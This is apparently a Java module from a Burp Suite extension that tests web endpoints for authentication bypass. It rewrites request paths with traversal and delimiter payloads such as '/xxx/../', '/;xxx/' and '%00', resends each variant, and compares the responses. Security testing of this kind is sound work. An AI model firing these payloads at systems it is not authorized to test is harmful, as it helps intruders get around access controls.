package burp.task;

import burp.*;
import burp.impl.VulResult;
import burp.impl.VulTaskImpl;
import java.util.ArrayList;
import java.util.List;

public class BypassAuth extends VulTaskImpl {

    public BypassAuth(IExtensionHelpers helpers, IBurpExtenderCallbacks callbacks, List<BurpExtender.LogEntry> log, IHttpRequestResponse messageInfo) {
        super(helpers, callbacks, log, messageInfo);
    }

    @Override
    public VulResult run() {
        /**
         * 绕过鉴权
         * */
        // 后缀检查，静态资源不做测试
        if (isStaticSource(path)){
            return null;
        }

        List<String> bypass_str = new ArrayList<String>();
        bypass_str.add("/xxx/../");
        bypass_str.add("/;xxx/");
        bypass_str.add("/aaa;xxx/../");
        bypass_str.add(";");
        bypass_str.add("/./");
        bypass_str.add("////");
        bypass_str.add("%00");
        bypass_str.add("%20");

        // 将path拆解
        String[] paths = path.split("/");
        List<String> bypass_path = new ArrayList<String>();
        // 添加bypass，如:/api/test -> /api/xxx/../test/xxx/../
        for (String str :
                bypass_str) {
            StringBuilder sb = new StringBuilder();
            for (String p :
                    paths) {
                sb.append(p + str + "/");
            }
            bypass_path.add(sb.toString());
        }
        //修改api
        String query = request_header_list.get(0);
        List<String> new_headers = request_header_list;
        String header_first = "";

        for (String bypass :
                bypass_path) {
            //url有参数
            header_first = query.replace(path, bypass);

            new_headers.remove(0);
            new_headers.add(0, header_first);

            //新的请求包
            byte[] req = this.helpers.buildHttpMessage(new_headers, request_body);
//            callbacks.printOutput(new String(req));
            IHttpRequestResponse messageInfo1 = this.callbacks.makeHttpRequest(iHttpService, req);
            //新的返回包
            IResponseInfo analyzeResponse1 = this.helpers.analyzeResponse(messageInfo1.getResponse());
            String response_info1 = new String(messageInfo1.getResponse());
            String rep1_body = response_info1.substring(analyzeResponse1.getBodyOffset());
            status = analyzeResponse1.getStatusCode();

            //如果状态码相同则可能存在问题
            if (status_code == analyzeResponse1.getStatusCode()
                    && resp_body.equalsIgnoreCase(rep1_body)) {
                message = "BypassAuth";
                messageInfo_r = messageInfo1;
            }
        }


        if (!message.equalsIgnoreCase("")){
            result = logAdd(messageInfo_r, host, path, method, status, message, "");
        }

        return result;
    }
}
